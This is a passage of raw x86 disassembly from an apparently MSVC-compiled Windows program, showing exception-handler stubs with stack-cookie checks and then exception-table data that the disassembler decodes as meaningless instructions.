  4083b7:	int3   
  4083b8:	int3   
  4083b9:	int3   
  4083ba:	int3   
  4083bb:	lea    ecx,[ebp-0xa4]
  4083c1:	jmp    0x40616f
  4083c6:	mov    edx,DWORD PTR [esp+0x8]
  4083ca:	lea    eax,[edx+0xc]
  4083cd:	mov    ecx,DWORD PTR [edx-0xa8]
  4083d3:	xor    ecx,eax
  4083d5:	call   0x407750
  4083da:	mov    eax,0x408a98
  4083df:	jmp    0x407fc8
  4083e4:	int3   
  4083e5:	int3   
  4083e6:	int3   
  4083e7:	int3   
  4083e8:	int3   
  4083e9:	lea    ecx,[ebp-0x234]
  4083ef:	jmp    0x402145
  4083f4:	lea    ecx,[ebp-0x220]
  4083fa:	jmp    0x40321c
  4083ff:	lea    ecx,[ebp-0x228]
  408405:	jmp    0x40321c
  40840a:	lea    ecx,[ebp-0x224]
  408410:	jmp    0x40321c
  408415:	mov    edx,DWORD PTR [esp+0x8]
  408419:	lea    eax,[edx+0xc]
  40841c:	mov    ecx,DWORD PTR [edx-0x238]
  408422:	xor    ecx,eax
  408424:	call   0x407750
  408429:	mov    ecx,DWORD PTR [edx-0x4]
  40842c:	xor    ecx,eax
  40842e:	call   0x407750
  408433:	mov    eax,0x408ac4
  408438:	jmp    0x407fc8
  40843d:	int3   
  40843e:	int3   
  40843f:	int3   
  408440:	int3   
  408441:	int3   
  408442:	mov    ecx,DWORD PTR [ebp-0x10]
  408445:	jmp    0x40321c
  40844a:	mov    edx,DWORD PTR [esp+0x8]
  40844e:	lea    eax,[edx+0xc]
  408451:	mov    ecx,DWORD PTR [edx-0x18]
  408454:	xor    ecx,eax
  408456:	call   0x407750
  40845b:	mov    eax,0x408b08
  408460:	jmp    0x407fc8
  408465:	int3   
  408466:	int3   
  408467:	int3   
  408468:	int3   
  408469:	int3   
  40846a:	mov    ecx,DWORD PTR [ebp+0x8]
  40846d:	jmp    0x40321c
  408472:	mov    edx,DWORD PTR [esp+0x8]
  408476:	lea    eax,[edx+0xc]
  408479:	mov    ecx,DWORD PTR [edx-0x20]
  40847c:	xor    ecx,eax
  40847e:	call   0x407750
  408483:	mov    eax,0x408b34
  408488:	jmp    0x407fc8
  40848d:	int3   
  40848e:	int3   
  40848f:	int3   
  408490:	int3   
  408491:	int3   
  408492:	lea    ecx,[ebp-0x10]
  408495:	jmp    0x40321c
  40849a:	lea    ecx,[ebp-0x10]
  40849d:	jmp    0x40321c
  4084a2:	mov    edx,DWORD PTR [esp+0x8]
  4084a6:	lea    eax,[edx+0xc]
  4084a9:	mov    ecx,DWORD PTR [edx-0x14]
  4084ac:	xor    ecx,eax
  4084ae:	call   0x407750
  4084b3:	mov    eax,0x408b60
  4084b8:	jmp    0x407fc8
  4084bd:	int3   
  4084be:	int3   
  4084bf:	int3   
  4084c0:	int3   
  4084c1:	int3   
  4084c2:	jmp    0x405c30
  4084c7:	mov    edx,DWORD PTR [esp+0x8]
  4084cb:	lea    eax,[edx+0xc]
  4084ce:	mov    ecx,DWORD PTR [edx-0x14]
  4084d1:	xor    ecx,eax
  4084d3:	call   0x407750
  4084d8:	mov    eax,0x408b94
  4084dd:	jmp    0x407fc8
  4084e2:	int3   
  4084e3:	int3   
  4084e4:	int3   
  4084e5:	int3   
  4084e6:	int3   
  4084e7:	lea    ecx,[ebp-0xa8]
  4084ed:	jmp    0x402145
  4084f2:	mov    edx,DWORD PTR [esp+0x8]
  4084f6:	lea    eax,[edx+0xc]
  4084f9:	mov    ecx,DWORD PTR [edx-0xac]
  4084ff:	xor    ecx,eax
  408501:	call   0x407750
  408506:	mov    ecx,DWORD PTR [edx-0x4]
  408509:	xor    ecx,eax
  40850b:	call   0x407750
  408510:	mov    eax,0x408bc0
  408515:	jmp    0x407fc8
  40851a:	int3   
  40851b:	int3   
  40851c:	int3   
  40851d:	int3   
  40851e:	int3   
  40851f:	lea    ecx,[ebp-0x18]
  408522:	jmp    0x402145
  408527:	lea    ecx,[ebp-0x24]
  40852a:	jmp    0x402145
  40852f:	mov    edx,DWORD PTR [esp+0x8]
  408533:	lea    eax,[edx+0xc]
  408536:	mov    ecx,DWORD PTR [edx-0x28]
  408539:	xor    ecx,eax
  40853b:	call   0x407750
  408540:	mov    eax,0x408bec
  408545:	jmp    0x407fc8
  40854a:	int3   
  40854b:	int3   
  40854c:	int3   
  40854d:	int3   
  40854e:	int3   
  40854f:	lea    ecx,[ebp-0x24]
  408552:	jmp    0x402145
  408557:	lea    ecx,[ebp-0x18]
  40855a:	jmp    0x402145
  40855f:	mov    edx,DWORD PTR [esp+0x8]
  408563:	lea    eax,[edx+0xc]
  408566:	mov    ecx,DWORD PTR [edx-0x28]
  408569:	xor    ecx,eax
  40856b:	call   0x407750
  408570:	mov    eax,0x408c20
  408575:	jmp    0x407fc8
  40857a:	int3   
  40857b:	int3   
  40857c:	int3   
  40857d:	int3   
  40857e:	int3   
  40857f:	lea    ecx,[ebp-0x14]
  408582:	jmp    0x40321c
  408587:	lea    ecx,[ebp-0x10]
  40858a:	jmp    0x4023c8
  40858f:	mov    edx,DWORD PTR [esp+0x8]
  408593:	lea    eax,[edx+0xc]
  408596:	mov    ecx,DWORD PTR [edx-0x1c]
  408599:	xor    ecx,eax
  40859b:	call   0x407750
  4085a0:	mov    eax,0x408c54
  4085a5:	jmp    0x407fc8
  4085aa:	int3   
  4085ab:	int3   
  4085ac:	int3   
  4085ad:	int3   
  4085ae:	int3   
  4085af:	lea    ecx,[ebp-0x248]
  4085b5:	jmp    0x402145
  4085ba:	lea    ecx,[ebp-0x23c]
  4085c0:	jmp    0x402145
  4085c5:	lea    ecx,[ebp-0x228]
  4085cb:	jmp    0x4023c8
  4085d0:	mov    edx,DWORD PTR [esp+0x8]
  4085d4:	lea    eax,[edx+0xc]
  4085d7:	mov    ecx,DWORD PTR [edx-0x254]
  4085dd:	xor    ecx,eax
  4085df:	call   0x407750
  4085e4:	mov    ecx,DWORD PTR [edx-0x4]
  4085e7:	xor    ecx,eax
  4085e9:	call   0x407750
  4085ee:	mov    eax,0x408c88
  4085f3:	jmp    0x407fc8
  4085f8:	int3   
  4085f9:	int3   
  4085fa:	int3   
  4085fb:	int3   
  4085fc:	int3   
  4085fd:	lea    ecx,[ebp-0x14]
  408600:	jmp    0x4023c8
  408605:	lea    ecx,[ebp-0x10]
  408608:	jmp    0x4023c8
  40860d:	mov    edx,DWORD PTR [esp+0x8]
  408611:	lea    eax,[edx+0xc]
  408614:	mov    ecx,DWORD PTR [edx-0x6c]
  408617:	xor    ecx,eax
  408619:	call   0x407750
  40861e:	mov    eax,0x408cc4
  408623:	jmp    0x407fc8
  408628:	int3   
  408629:	int3   
  40862a:	int3   
  40862b:	int3   
  40862c:	int3   
  40862d:	int3   
  40862e:	int3   
  40862f:	int3   
  408630:	mov    ecx,0x40977c
  408635:	jmp    0x407117
  40863a:	int3   
  40863b:	int3   
  40863c:	int3   
  40863d:	int3   
  40863e:	int3   
  40863f:	int3   
  408640:	mov    DWORD PTR ds:0x4093c0,0x4013a8
  40864a:	ret    
  40864b:	int3   
  40864c:	int3   
  40864d:	int3   
  40864e:	int3   
  40864f:	int3   
  408650:	push   0x4097a8
  408655:	call   DWORD PTR ds:0x40a074
  40865b:	jmp    0x4072a3
  408660:	int3   
  408661:	int3   
  408662:	int3   
  408663:	int3   
  408664:	int3   
  408665:	int3   
  408666:	int3   
  408667:	int3   
  408668:	int3   
  408669:	int3   
  40866a:	int3   
  40866b:	int3   
  40866c:	int3   
  40866d:	int3   
  40866e:	int3   
  40866f:	int3   
  408670:	mov    edx,DWORD PTR ds:0x409794
  408676:	call   0x40733c
  40867b:	jmp    0x4073ca
  408680:	and    al,BYTE PTR ds:0x61993
  408686:	add    BYTE PTR [eax],al
  408688:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408689:	xchg   BYTE PTR [eax+0x0],al
  40868c:	add    DWORD PTR [eax],eax
  40868e:	add    BYTE PTR [eax],al
  408690:	aam    0x86
  408692:	inc    eax
	...
  4086a3:	add    bh,bh
  4086a5:	(bad)  
  4086a6:	(bad)  
  4086a7:	call   DWORD PTR [eax]
  4086a9:	add    BYTE PTR [eax+0x0],0x0
	...
  4086bd:	add    BYTE PTR [eax],al
  4086bf:	add    BYTE PTR [eax],bl
  4086c1:	add    BYTE PTR [eax+0x0],0x3
  4086c5:	add    BYTE PTR [eax],al
  4086c7:	add    BYTE PTR [eax],ah
  4086c9:	add    BYTE PTR [eax+0x0],0x3
  4086cd:	add    BYTE PTR [eax],al
  4086cf:	add    BYTE PTR [edx],ch
  4086d1:	add    BYTE PTR [eax+0x0],0x1
  4086d5:	add    BYTE PTR [eax],al
  4086d7:	add    BYTE PTR [ecx],al
  4086d9:	add    BYTE PTR [eax],al
  4086db:	add    BYTE PTR [edx],al
  4086dd:	add    BYTE PTR [eax],al
  4086df:	add    BYTE PTR [ecx],al
  4086e1:	add    BYTE PTR [eax],al
  4086e3:	add    al,ch
  4086e5:	xchg   BYTE PTR [eax+0x0],al
  4086e8:	or     BYTE PTR [eax],al
  4086ea:	add    BYTE PTR [eax],al
  4086ec:	loopne 0x408681
  4086ee:	inc    eax
  4086ef:	add    al,bl
  4086f1:	(bad)  
  4086f2:	(bad)  
  4086f3:	(bad)  
  4086f4:	(bad)  
  4086f5:	sub    al,0x40
  4086f7:	add    BYTE PTR [edx],ah
  4086f9:	add    eax,0x91993
  4086fe:	add    BYTE PTR [eax],al
  408700:	and    BYTE PTR [edi+0x40],al
	...
  408716:	add    BYTE PTR [eax],al
  408718:	add    DWORD PTR [eax],eax
  40871a:	add    BYTE PTR [eax],al
  40871c:	add    BYTE PTR [eax],al
  40871e:	add    BYTE PTR [eax],al
  408720:	(bad)  
  408721:	(bad)  
  408722:	(bad)  
  408723:	call   DWORD PTR [edx-0x80]
  408726:	inc    eax
  408727:	add    BYTE PTR [eax],al
  408729:	add    BYTE PTR [eax],al
  40872b:	add    BYTE PTR [edx-0x80],bl
  40872e:	inc    eax
  40872f:	add    BYTE PTR [ecx],al
  408731:	add    BYTE PTR [eax],al
  408733:	add    BYTE PTR [ebp-0x80],ah
  408736:	inc    eax
  408737:	add    BYTE PTR [edx],al
  408739:	add    BYTE PTR [eax],al
  40873b:	add    BYTE PTR [eax-0x80],dh
  40873e:	inc    eax
  40873f:	add    BYTE PTR [ebx],al
  408741:	add    BYTE PTR [eax],al
  408743:	add    BYTE PTR [ebx-0x80],bh
  408746:	inc    eax
  408747:	add    BYTE PTR [eax+eax*1],al
  40874a:	add    BYTE PTR [eax],al
  40874c:	xchg   BYTE PTR [eax+0x50040],al
  408752:	add    BYTE PTR [eax],al
  408754:	xchg   ecx,eax
  408755:	add    BYTE PTR [eax+0x0],0x6
  408759:	add    BYTE PTR [eax],al
  40875b:	add    BYTE PTR [eax+eax*4+0x70040],bl
  408762:	add    BYTE PTR [eax],al
  408764:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408765:	add    BYTE PTR [eax+0x0],0x22
  408769:	add    eax,0x61993
  40876e:	add    BYTE PTR [eax],al
  408770:	mov    WORD PTR [edi+0x30040],es
  408776:	add    BYTE PTR [eax],al
  408778:	mov    esp,0x4087
	...
  408785:	add    BYTE PTR [eax],al
  408787:	add    BYTE PTR [ecx],al
  408789:	add    BYTE PTR [eax],al
  40878b:	add    bh,bh
  40878d:	(bad)  
  40878e:	(bad)  
  40878f:	inc    DWORD PTR [eax]
  408791:	add    BYTE PTR [eax],al
  408793:	add    bh,bh
  408795:	(bad)  
  408796:	(bad)  
  408797:	inc    DWORD PTR [eax]
  408799:	add    BYTE PTR [eax],al
  40879b:	add    bh,bh
  40879d:	(bad)  
  40879e:	(bad)  
  40879f:	inc    DWORD PTR [eax]
  4087a1:	add    BYTE PTR [eax],al
  4087a3:	add    bh,bh
  4087a5:	(bad)  
  4087a6:	(bad)  
  4087a7:	inc    DWORD PTR [eax]
  4087a9:	add    BYTE PTR [eax],al
  4087ab:	add    bh,bh
  4087ad:	(bad)  
  4087ae:	(bad)  
  4087af:	inc    DWORD PTR [eax]
  4087b1:	add    BYTE PTR [eax],al
  4087b3:	add    bh,bh
  4087b5:	(bad)  
  4087b6:	(bad)  
  4087b7:	inc    DWORD PTR [eax]
	...
  4087c1:	add    BYTE PTR [eax],al
  4087c3:	add    BYTE PTR [ecx],al
  4087c5:	add    BYTE PTR [eax],al
  4087c7:	add    BYTE PTR [ecx],al
  4087c9:	add    BYTE PTR [eax],al
  4087cb:	add    al,bh
  4087cd:	xchg   DWORD PTR [eax+0x0],eax
  4087d0:	add    al,BYTE PTR [eax]
  4087d2:	add    BYTE PTR [eax],al
  4087d4:	add    al,BYTE PTR [eax]
  4087d6:	add    BYTE PTR [eax],al
  4087d8:	add    eax,DWORD PTR [eax]
  4087da:	add    BYTE PTR [eax],al
  4087dc:	add    DWORD PTR [eax],eax
  4087de:	add    BYTE PTR [eax],al
  4087e0:	or     BYTE PTR [eax+0x40040],cl
  4087e6:	add    BYTE PTR [eax],al
  4087e8:	add    al,0x0
  4087ea:	add    BYTE PTR [eax],al
  4087ec:	add    eax,0x1000000
  4087f1:	add    BYTE PTR [eax],al
  4087f3:	add    BYTE PTR [eax],bl
  4087f5:	mov    BYTE PTR [eax+0x0],al
  4087f8:	or     BYTE PTR [eax],al
  4087fa:	add    BYTE PTR [eax],al
  4087fc:	loopne 0x408791
  4087fe:	inc    eax
  4087ff:	add    al,cl
  408801:	idiv   edi
  408803:	push   DWORD PTR [edi+0x30]
  408806:	inc    eax
  408807:	add    BYTE PTR [eax],cl
  408809:	add    BYTE PTR [eax],al
  40880b:	add    al,ah
  40880d:	xchg   ebx,eax
  40880e:	inc    eax
  40880f:	add    ah,al
  408811:	idiv   edi
  408813:	(bad)  
  408814:	sti    
  408815:	das    
  408816:	inc    eax
  408817:	add    BYTE PTR [eax],cl
  408819:	add    BYTE PTR [eax],al
  40881b:	add    al,ah
  40881d:	xchg   ebx,eax
  40881e:	inc    eax
  40881f:	add    al,al
  408821:	idiv   edi
  408823:	call   DWORD PTR [ebx+0x30]
  408826:	inc    eax
  408827:	add    BYTE PTR [edx],ah
  408829:	add    eax,0x21993
  40882e:	add    BYTE PTR [eax],al
  408830:	dec    esp
  408831:	mov    BYTE PTR [eax+0x0],al
	...
  408848:	add    DWORD PTR [eax],eax
  40884a:	add    BYTE PTR [eax],al
  40884c:	(bad)  
  40884d:	(bad)  
  40884e:	(bad)  
  40884f:	(bad)  
  408850:	inc    DWORD PTR [eax-0xffc0]
  408856:	(bad)  
  408857:	inc    DWORD PTR [edi]
  408859:	add    DWORD PTR [eax+0x0],0x19930522
  408860:	add    al,BYTE PTR [eax]
  408862:	add    BYTE PTR [eax],al
  408864:	or     BYTE PTR [eax+0x40],0x0
	...
  40887f:	add    bh,bh
  408881:	(bad)  
  408882:	(bad)  
  408883:	jmp    FWORD PTR [edi]
  408885:	add    DWORD PTR [eax+0x0],0x0
  40888c:	cmp    al,BYTE PTR [ecx+0x5220040]
  408892:	xchg   ebx,eax
  408893:	sbb    DWORD PTR [edi],eax
  408895:	add    BYTE PTR [eax],al
  408897:	add    BYTE PTR [eax+ecx*4+0x40],dh
	...
  4088b2:	add    BYTE PTR [eax],al
  4088b4:	(bad)  
  4088b5:	(bad)  
  4088b6:	(bad)  
  4088b7:	push   DWORD PTR [edx-0x7f]
  4088ba:	inc    eax
  4088bb:	add    BYTE PTR [eax],al
  4088bd:	add    BYTE PTR [eax],al
  4088bf:	add    BYTE PTR [ebp-0x7f],bh
  4088c2:	inc    eax
  4088c3:	add    BYTE PTR [ecx],al
  4088c5:	add    BYTE PTR [eax],al
  4088c7:	add    BYTE PTR [eax+0x2004081],cl
  4088cd:	add    BYTE PTR [eax],al
  4088cf:	add    BYTE PTR [ebx+0x3004081],dl
  4088d5:	add    BYTE PTR [eax],al
  4088d7:	add    BYTE PTR [esi+0x4004081],bl
  4088dd:	add    BYTE PTR [eax],al
  4088df:	add    BYTE PTR [ecx+0x2004081],ch
  4088e5:	add    BYTE PTR [eax],al
  4088e7:	add    BYTE PTR [ecx+eax*4+0x5220040],dh
  4088ee:	xchg   ebx,eax
  4088ef:	sbb    DWORD PTR [esi],eax
  4088f1:	add    BYTE PTR [eax],al
  4088f3:	add    BYTE PTR [eax],dl
  4088f5:	mov    DWORD PTR [eax+0x0],eax
	...
  408910:	(bad)  
  408911:	(bad)  
  408912:	(bad)  
  408913:	(bad)  
  408914:	in     al,dx
  408915:	add    DWORD PTR [eax+0x0],0x0
  40891c:	hlt    
  40891d:	add    DWORD PTR [eax+0x0],0x1
  408924:	cld    
  408925:	add    DWORD PTR [eax+0x0],0x1
  40892c:	add    al,0x82
  40892e:	inc    eax
  40892f:	add    BYTE PTR [ecx],al
  408931:	add    BYTE PTR [eax],al
  408933:	add    BYTE PTR [edx+eax*4],cl
  408936:	inc    eax
  408937:	add    BYTE PTR [ecx],al
  408939:	add    BYTE PTR [eax],al
  40893b:	add    BYTE PTR ds:0x22004082,ah
  408941:	add    eax,0x41993
  408946:	add    BYTE PTR [eax],al
  408948:	mov    DWORD PTR fs:[eax+0x0],eax
	...
  408964:	(bad)  
  408965:	(bad)  
  408966:	(bad)  
  408967:	dec    DWORD PTR [ebp-0x7e]
  40896a:	inc    eax
  40896b:	add    BYTE PTR [eax],al
  40896d:	add    BYTE PTR [eax],al
  40896f:	add    BYTE PTR [ebp-0x7e],dl
  408972:	inc    eax
  408973:	add    BYTE PTR [ecx],al
  408975:	add    BYTE PTR [eax],al
  408977:	add    BYTE PTR [ebp-0x7e],bl
  40897a:	inc    eax
  40897b:	add    BYTE PTR [eax],al
  40897d:	add    BYTE PTR [eax],al
  40897f:	add    BYTE PTR [ebp-0x7e],ah
  408982:	inc    eax
  408983:	add    BYTE PTR [edx],ah
  408985:	add    eax,0x21993
  40898a:	add    BYTE PTR [eax],al
  40898c:	test   al,0x89
  40898e:	inc    eax
	...
  4089a7:	add    bh,bh
  4089a9:	(bad)  
  4089aa:	(bad)  
  4089ab:	dec    DWORD PTR [ebp+0x4082]
  4089b1:	add    BYTE PTR [eax],al
  4089b3:	add    BYTE PTR [eax+0x22004082],bl
  4089b9:	add    eax,0x21993
  4089be:	add    BYTE PTR [eax],al
  4089c0:	fmul   QWORD PTR [ecx+0x40]
	...
  4089da:	add    BYTE PTR [eax],al
  4089dc:	(bad)  
  4089dd:	(bad)  
  4089de:	(bad)  
  4089df:	call   eax
  4089e1:	add    BYTE PTR [eax+0x0],0x0
  4089e5:	add    BYTE PTR [eax],al
  4089e7:	add    al,bl
  4089e9:	add    BYTE PTR [eax+0x0],0x22
  4089ed:	add    eax,0x11993
  4089f2:	add    BYTE PTR [eax],al
  4089f4:	adc    BYTE PTR [edx+0x40],cl
	...
  408a0a:	add    BYTE PTR [eax],al
  408a0c:	add    DWORD PTR [eax],eax
  408a0e:	add    BYTE PTR [eax],al
  408a10:	(bad)  
  408a11:	(bad)  
  408a12:	(bad)  
  408a13:	inc    DWORD PTR [eax]
  408a15:	add    DWORD PTR [eax+0x0],0x22
  408a19:	add    eax,0x61993
  408a1e:	add    BYTE PTR [eax],al
  408a20:	cmp    al,0x8a
  408a22:	inc    eax
	...
  408a3b:	add    bh,bh
  408a3d:	(bad)  
  408a3e:	(bad)  
  408a3f:	inc    DWORD PTR [ebx-0x7d]
  408a42:	inc    eax
  408a43:	add    BYTE PTR [eax],al
  408a45:	add    BYTE PTR [eax],al
  408a47:	add    BYTE PTR [ebx-0x7d],cl
  408a4a:	inc    eax
  408a4b:	add    BYTE PTR [ecx],al
  408a4d:	add    BYTE PTR [eax],al
  408a4f:	add    BYTE PTR [ebx-0x7d],dl
  408a52:	inc    eax
  408a53:	add    BYTE PTR [edx],al
  408a55:	add    BYTE PTR [eax],al
  408a57:	add    BYTE PTR [ebx-0x7d],bl
  408a5a:	inc    eax
  408a5b:	add    BYTE PTR [edx],al
  408a5d:	add    BYTE PTR [eax],al
  408a5f:	add    BYTE PTR [ebx-0x7d],ah
  408a62:	inc    eax
  408a63:	add    BYTE PTR [edx],al
  408a65:	add    BYTE PTR [eax],al
  408a67:	add    BYTE PTR [ebx-0x7d],ch
  408a6a:	inc    eax
  408a6b:	add    BYTE PTR [edx],ah
  408a6d:	add    eax,0x11993
  408a72:	add    BYTE PTR [eax],al
  408a74:	nop
  408a75:	mov    al,BYTE PTR [eax+0x0]
	...
  408a90:	(bad)  
  408a91:	(bad)  
  408a92:	(bad)  
  408a93:	call   DWORD PTR [ebx+0x22004083]
  408a99:	add    eax,0x11993
  408a9e:	add    BYTE PTR [eax],al
  408aa0:	mov    esp,0x408a
	...
  408ab9:	add    BYTE PTR [eax],al
  408abb:	add    bh,bh
  408abd:	(bad)  
  408abe:	(bad)  
  408abf:	(bad)  
  408ac0:	mov    ebx,0x22004083
  408ac5:	add    eax,0x41993
  408aca:	add    BYTE PTR [eax],al
  408acc:	call   0x40cb5b
	...
  408ae5:	add    BYTE PTR [eax],al
  408ae7:	add    bh,bh
  408ae9:	(bad)  
  408aea:	(bad)  
  408aeb:	(bad)  
  408aec:	jmp    0x40cb74
  408af1:	add    BYTE PTR [eax],al
  408af3:	add    ah,dh
  408af5:	add    DWORD PTR [eax+0x0],0x1
  408af9:	add    BYTE PTR [eax],al
  408afb:	add    bh,bh
  408afd:	add    DWORD PTR [eax+0x0],0x2
  408b01:	add    BYTE PTR [eax],al
  408b03:	add    BYTE PTR [edx],cl
  408b05:	test   BYTE PTR [eax+0x0],al
  408b08:	and    al,BYTE PTR ds:0x11993
  408b0e:	add    BYTE PTR [eax],al
  408b10:	sub    al,0x8b
  408b12:	inc    eax
	...
  408b27:	add    BYTE PTR [ecx],al
  408b29:	add    BYTE PTR [eax],al
  408b2b:	add    bh,bh
  408b2d:	(bad)  
  408b2e:	(bad)  
  408b2f:	inc    DWORD PTR [edx-0x7c]
  408b32:	inc    eax
  408b33:	add    BYTE PTR [edx],ah
  408b35:	add    eax,0x11993
  408b3a:	add    BYTE PTR [eax],al
  408b3c:	pop    eax
  408b3d:	mov    eax,DWORD PTR [eax+0x0]
	...
  408b54:	add    DWORD PTR [eax],eax
  408b56:	add    BYTE PTR [eax],al
  408b58:	(bad)  
  408b59:	(bad)  
  408b5a:	(bad)  
  408b5b:	jmp    FWORD PTR [edx-0x7c]
  408b5e:	inc    eax
  408b5f:	add    BYTE PTR [edx],ah
  408b61:	add    eax,0x21993
  408b66:	add    BYTE PTR [eax],al
  408b68:	test   BYTE PTR [ebx+0x40],cl
	...
  408b7e:	add    BYTE PTR [eax],al
  408b80:	add    DWORD PTR [eax],eax
  408b82:	add    BYTE PTR [eax],al
  408b84:	(bad)  
  408b85:	(bad)  
  408b86:	(bad)  
  408b87:	call   DWORD PTR [edx-0xffbf7c]
  408b8d:	(bad)  
  408b8e:	(bad)  
  408b8f:	call   FWORD PTR [edx+0x22004084]
  408b95:	add    eax,0x11993
  408b9a:	add    BYTE PTR [eax],al
  408b9c:	mov    eax,0x408b
	...
  408bb1:	add    BYTE PTR [eax],al
  408bb3:	add    BYTE PTR [ecx],al
  408bb5:	add    BYTE PTR [eax],al
  408bb7:	add    bh,bh
  408bb9:	(bad)  
  408bba:	(bad)  
  408bbb:	inc    edx
  408bbd:	test   BYTE PTR [eax+0x0],al
  408bc0:	and    al,BYTE PTR ds:0x11993
  408bc6:	add    BYTE PTR [eax],al
  408bc8:	in     al,0x8b
  408bca:	inc    eax
	...
  408be3:	add    bh,bh
  408be5:	(bad)  
  408be6:	(bad)  
  408be7:	jmp    edi
  408be9:	test   BYTE PTR [eax+0x0],al
  408bec:	and    al,BYTE PTR ds:0x21993
  408bf2:	add    BYTE PTR [eax],al
  408bf4:	adc    BYTE PTR [eax+eax*2+0x0],cl
	...
  408c0f:	add    bh,bh
  408c11:	(bad)  
  408c12:	(bad)  
  408c13:	call   FWORD PTR [edi]
  408c15:	test   DWORD PTR [eax+0x0],eax
  408c18:	add    BYTE PTR [eax],al
  408c1a:	add    BYTE PTR [eax],al
  408c1c:	daa    
  408c1d:	test   DWORD PTR [eax+0x0],eax
  408c20:	and    al,BYTE PTR ds:0x21993
  408c26:	add    BYTE PTR [eax],al
  408c28:	inc    esp
  408c29:	mov    WORD PTR [eax+0x0],es
	...
  408c44:	(bad)  
  408c45:	(bad)  
  408c46:	(bad)  
  408c47:	dec    DWORD PTR [edi-0x7b]
  408c4a:	inc    eax
  408c4b:	add    BYTE PTR [eax],al
  408c4d:	add    BYTE PTR [eax],al
  408c4f:	add    BYTE PTR [edi-0x7b],dl
  408c52:	inc    eax
  408c53:	add    BYTE PTR [edx],ah
  408c55:	add    eax,0x21993
  408c5a:	add    BYTE PTR [eax],al
  408c5c:	js     0x408bea
  408c5e:	inc    eax
	...
  408c77:	add    bh,bh
  408c79:	(bad)  
  408c7a:	(bad)  
  408c7b:	(bad)  
  408c7c:	jg     0x408c03
  408c7e:	inc    eax
  408c7f:	add    BYTE PTR [eax],al
  408c81:	add    BYTE PTR [eax],al
  408c83:	add    BYTE PTR [edi+0x22004085],al
  408c89:	add    eax,0x31993
  408c8e:	add    BYTE PTR [eax],al
  408c90:	lods   al,BYTE PTR ds:[esi]
  408c91:	mov    WORD PTR [eax+0x0],es
	...
  408cac:	(bad)  
  408cad:	(bad)  
  408cae:	(bad)  
  408caf:	jmp    FWORD PTR [edi+0x4085]
  408cb5:	add    BYTE PTR [eax],al
  408cb7:	add    BYTE PTR [edx+0x1004085],bh
  408cbd:	add    BYTE PTR [eax],al
  408cbf:	add    ch,al
  408cc1:	test   DWORD PTR [eax+0x0],eax
  408cc4:	and    al,BYTE PTR ds:0x21993
  408cca:	add    BYTE PTR [eax],al
  408ccc:	call   0x40cd5d
	...
  408ce5:	add    BYTE PTR [eax],al
  408ce7:	add    bh,bh
  408ce9:	(bad)  
  408cea:	(bad)  
  408ceb:	(bad)  
  408cec:	std    
  408ced:	test   DWORD PTR [eax+0x0],eax
  408cf0:	add    BYTE PTR [eax],al
  408cf2:	add    BYTE PTR [eax],al
  408cf4:	add    eax,0xfe004086
  408cf9:	(bad)  
  408cfa:	(bad)  
  408cfb:	inc    DWORD PTR [eax]
  408cfd:	add    BYTE PTR [eax],al
  408cff:	add    ah,dl
  408d01:	(bad)  
  408d02:	(bad)  
  408d03:	inc    DWORD PTR [eax]
  408d05:	add    BYTE PTR [eax],al
  408d07:	add    dh,bh
  408d09:	(bad)  
  408d0a:	(bad)  
  408d0b:	jmp    DWORD PTR [esi]
  408d0d:	je     0x408d4f
  408d0f:	add    BYTE PTR [ecx],bh
  408d11:	je     0x408d53
  408d13:	add    BYTE PTR [eax],al
  408d15:	add    BYTE PTR [eax],al
  408d17:	add    ah,ah
  408d19:	(bad)  
  408d1a:	(bad)  
  408d1b:	inc    DWORD PTR [eax]
  408d1d:	add    BYTE PTR [eax],al
  408d1f:	add    al,dl
  408d21:	(bad)  
  408d22:	(bad)  
  408d23:	inc    DWORD PTR [eax]
  408d25:	add    BYTE PTR [eax],al
  408d27:	add    dh,bh
  408d29:	(bad)  
  408d2a:	(bad)  
  408d2b:	call   DWORD PTR [edi-0x54ffbf8a]
  408d31:	jbe    0x408d73
  408d33:	add    BYTE PTR [eax],al
  408d35:	add    BYTE PTR [eax],al
  408d37:	add    dh,bh
  408d39:	(bad)  
  408d3a:	(bad)  
  408d3b:	inc    DWORD PTR [eax]
  408d3d:	add    BYTE PTR [eax],al
  408d3f:	add    ah,dl
  408d41:	(bad)  
  408d42:	(bad)  
  408d43:	inc    DWORD PTR [eax]
  408d45:	add    BYTE PTR [eax],al
  408d47:	add    dh,bh
  408d49:	(bad)  
  408d4a:	(bad)  
  408d4b:	dec    DWORD PTR [ecx+edi*2+0x79900040]
  408d52:	inc    eax
  408d53:	add    BYTE PTR [eax],al
  408d55:	add    BYTE PTR [eax],al
  408d57:	add    dh,bh
  408d59:	(bad)  
  408d5a:	(bad)  
  408d5b:	inc    DWORD PTR [eax]
  408d5d:	add    BYTE PTR [eax],al
  408d5f:	add    al,bl
  408d61:	(bad)  
  408d62:	(bad)  
  408d63:	inc    DWORD PTR [eax]
  408d65:	add    BYTE PTR [eax],al
  408d67:	add    dh,bh
  408d69:	(bad)  
  408d6a:	(bad)  
  408d6b:	(bad)  
  408d6c:	jmp    0x408de8
  408d6e:	inc    eax
  408d6f:	add    dh,bh
  408d71:	jp     0x408db3
  408d73:	add    BYTE PTR [eax],al
  408d75:	add    BYTE PTR [eax],al
  408d77:	add    ah,ah
  408d79:	(bad)  
  408d7a:	(bad)  
  408d7b:	inc    DWORD PTR [eax]
  408d7d:	add    BYTE PTR [eax],al
  408d7f:	add    al,cl
  408d81:	(bad)  
  408d82:	(bad)  
  408d83:	inc    DWORD PTR [eax]
  408d85:	add    BYTE PTR [eax],al
  408d87:	add    dh,bh
  408d89:	(bad)  
  408d8a:	(bad)  
  408d8b:	inc    DWORD PTR [eax]
  408d8d:	add    BYTE PTR [eax],al
  408d8f:	add    BYTE PTR [edi+0x7d],al
  408d92:	inc    eax
  408d93:	add    BYTE PTR [eax],al
  408d95:	add    BYTE PTR [eax],al
  408d97:	add    al,ah
  408d99:	xchg   ebx,eax
  408d9a:	inc    eax
  408d9b:	add    BYTE PTR [eax],al
  408d9d:	add    BYTE PTR [eax],al
  408d9f:	add    bh,bh
  408da1:	(bad)  
  408da2:	(bad)  
  408da3:	inc    DWORD PTR [eax]
  408da5:	add    BYTE PTR [eax],al
  408da7:	add    BYTE PTR [eax+eax*1],al
  408daa:	add    BYTE PTR [eax],al
  408dac:	add    BYTE PTR [eax],al
  408dae:	add    BYTE PTR [eax],al
  408db0:	add    DWORD PTR [eax],eax
  408db2:	add    BYTE PTR [eax],al
  408db4:	xchg   esp,eax
